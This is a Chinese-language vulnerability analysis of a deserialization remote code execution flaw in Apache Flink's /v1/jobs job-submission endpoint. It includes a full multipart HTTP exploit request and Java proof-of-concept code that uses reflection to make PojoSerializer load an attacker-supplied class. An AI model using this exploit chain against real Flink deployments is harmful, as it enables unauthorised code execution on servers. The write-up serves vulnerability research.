0x01 漏洞入口
---------

实际上漏洞入口在 **JobSubmitHandler** 当中，**orich1** 师傅在《Apache Flink 多个漏洞分析》这篇文章也提及了，具体路由也是 **/v1/jobs** ，但是这里具体看看参数怎么入参的，实际上可以看到下图中`request.getUploadedFiles()`获取request请求中的文件内容，然后调用 **loadJobGraph** 方法进行下一步处理。

![image-20210207183439861](https://shs3.b.qianxin.com/butian_public/f47ca9e5f0616534917505d6f0ac91004.jpg)

在 **loadJobGraph** 方法当中，可以看到 **getPathAndAssertUpload** 方法根据`requestBody.jobGraphFileName`方法当中参数，获取当前上传文件的路径，然后调用java的 **ObjectInputStream** 获取数据传入，紧接的就是反序列化入口了。

![image-20210207183656378](https://shs3.b.qianxin.com/butian_public/f372c69a0461ca36565ef3082888e38ab.jpg)

先看看`requestBody.jobGraphFileName`，实际上这里是做了json的注释，所以怎么入参，实际上有个理解了，在一个POST请求当中，先上传序列化文件，然后调用json格式，例如`{"jobGraphFileName":"2.graph"}`，获取上传文件，然后执行反序列化。

![image-20210207183925719](https://shs3.b.qianxin.com/butian_public/f57bd5332d7c6544cd8714a164ad91da0.jpg)

所以post 包如下所示：

```php
POST /v1/jobs HTTP/1.1
Host: localhost:8081
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoZ8meKnrrso89R6Y
Content-Length: 3596

------WebKitFormBoundaryoZ8meKnrrso89R6Y
Content-Disposition: form-data; name="file_0"; filename="2.graph"

payload.ser
------WebKitFormBoundaryoZ8meKnrrso89R6Y
Content-Disposition: form-data; name="request"

{"jobGraphFileName":"2.graph"}
------WebKitFormBoundaryoZ8meKnrrso89R6Y--
```

0x02 序列化构造
----------

根据 **orich1** 师傅的文章：

> PojoSerializer，其 deserialize 函数会调用class.forname，且第二参数为 true （会执行类初始化，调用 static 代码块）

要如何构造的关键点实际上是 **StateDescriptor#readObject** 当中。

```java
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        boolean hasDefaultValue = in.readBoolean();
        if (hasDefaultValue) {
            TypeSerializer<T> serializer = (TypeSerializer)this.serializerAtomicReference.get();
            ...
                    try {
                        this.defaultValue = serializer.deserialize(inView);
```

实际上在这里，我们可以把`serializer.deserialize`的 **serializer** 通过一定的方法修改成 **PojoSerializer** 就能达到我们的目的。

![image-20210207185327123](https://shs3.b.qianxin.com/butian_public/f7e9c35658bcb3527fc8b10aaa12814be.jpg)

**serializer** 对象是通过下图中的代码获取得到的。

```java
            TypeSerializer<T> serializer = (TypeSerializer)this.serializerAtomicReference.get();
```

而实际上 **serializerAtomicReference** 实际上是在 **StateDescriptor** 通过实例化 **AtomicReference** 对象，并调用这个对象中的get方法获取当前的序列化对象，所以我们可以逆向思维，构造的时候直接实际例化这个对象，利用反射放入 **PojoSerializer** 即可。

```java
public abstract class StateDescriptor<S extends State, T> implements Serializable {
    private static final Logger LOG = LoggerFactory.getLogger(StateDescriptor.class);
    private static final long serialVersionUID = 1L;
    protected final String name;
    private final AtomicReference<TypeSerializer<T>> serializerAtomicReference = new AtomicReference();
```

所以这部分POC：

```java
    AtomicReference<TypeSerializer> atomicReference = new AtomicReference<TypeSerializer>();
    PojoSerializer pojoSerializer = new PojoSerializer(Object.class, new TypeSerializer[0], new Field[0], new ExecutionConfig());
    atomicReference.set(pojoSerializer);
```

我们在玩下看 **ValueStateDescriptor** 是继承 **StateDescriptor** 对象，而 **StateDescriptor** 对象是一个可被序列化的对象，所以这里 **ValueStateDescriptor** 也是一个可被序列化的对象。

![image-20210207191554322](https://shs3.b.qianxin.com/butian_public/fb2e83523ce5982d5a8bcf9ae9d01756d.jpg)

在 **ValueStateDescriptor** 当中有这个一个构造方法，需要传入 **typeSerializer** 和 **defaultValue**

```java
    public ValueStateDescriptor(String name, TypeSerializer<T> typeSerializer, T defaultValue) {
        super(name, typeSerializer, defaultValue);
    }
```

而 **typeSerializer** 和 **defaultValue** 在 **StateDescriptor** 类（也就是 **ValueStateDescriptor** 的父类），当中对应的属性是 **serializerAtomicReference** 和 **defaultValue** 。

```java
    protected StateDescriptor(String name, TypeSerializer<T> serializer, @Nullable T defaultValue) {
        this.ttlConfig = StateTtlConfig.DISABLED;
        this.name = (String)Preconditions.checkNotNull(name, "name must not be null");
        this.serializerAtomicReference.set(Preconditions.checkNotNull(serializer, "serializer must not be null"));
        this.defaultValue = defaultValue;
```

所以需要分别反射修改，这里要注意 **defaultValue** 这里我们把恶意对象放进去了。

```java
        ValueStateDescriptor valueStateDescriptor = Exp1.createWithoutConstructor(ValueStateDescriptor.class);
        Field field = StateDescriptor.class.getDeclaredField("defaultValue");
        field.setAccessible(true);
        field.set(valueStateDescriptor, new EvalClass());

        field = StateDescriptor.class.getDeclaredField("serializerAtomicReference");
        field.setAccessible(true);
        field.set(valueStateDescriptor, atomicReference);
```

这里有几个细节，首先 **ValueStateDescriptor** 为啥要无参构造，而不是直接构造，原因在于 **StateDescriptor** 方法当中实力化对象需要有些 **checknotnull** 的检查，这样构造比较方便。

![image-20210207194822760](https://shs3.b.qianxin.com/butian_public/f91f0b1714f3fa001394ccc2a80975dde.jpg)

其次 **defaultValue** 是因为反序列化的时候有个 **hasDefaultValue** 的检查。

![image-20210207194945277](https://shs3.b.qianxin.com/butian_public/f59c3d4e62aa26acc639e1b09a338e770.jpg)

这个 **hasDefaultValue** 的检查时序列化是 **StateDescriptor** 序列化的时候会根据 **defaultValue** 的值写入表示标位（true或者false）

![image-20210207195137261](https://shs3.b.qianxin.com/butian_public/f4c1a52cd5d007a338ada09bd20c0812a.jpg)

以及把需要加载的类名写入到序列化的字节流当中。

![image-20210207195344179](https://shs3.b.qianxin.com/butian_public/f0ea637407bc0f473c9260ca085ad0c85.jpg)

弹个窗。

![image-20210207200043566](https://shs3.b.qianxin.com/butian_public/f2a3c4c18235316161652e92649b6e342.jpg)

0x03 几个其他细节
-----------

首先当前的classloader和启动位置的当前路径有关系，在flink-1.11.1下启动。

![image-20210207195445612](https://shs3.b.qianxin.com/butian_public/f50124cbf88028dc8686cdbf44b5e7de2.jpg)

![image-20210207195540318](https://shs3.b.qianxin.com/butian_public/f6633fdbae810a698e663f72356480bf3.jpg)

在flink-1.11.1/bin下启动。

![image-20210207195737321](https://shs3.b.qianxin.com/butian_public/f5f00d01c14127088b04de5d112a616f3.jpg)

![image-20210207195719468](https://shs3.b.qianxin.com/butian_public/ff9d0f58c276c139a04a39fd054cf6ac9.jpg)

其次由于java的 **classloader** ，我们通过 **class.forname** 加载的类只能加载一次，如果你要执行其他命令，你需要重新生成序列化对象，上传编译后的 **class** ，通过 **POST /v1/jobs** 重新进行攻击。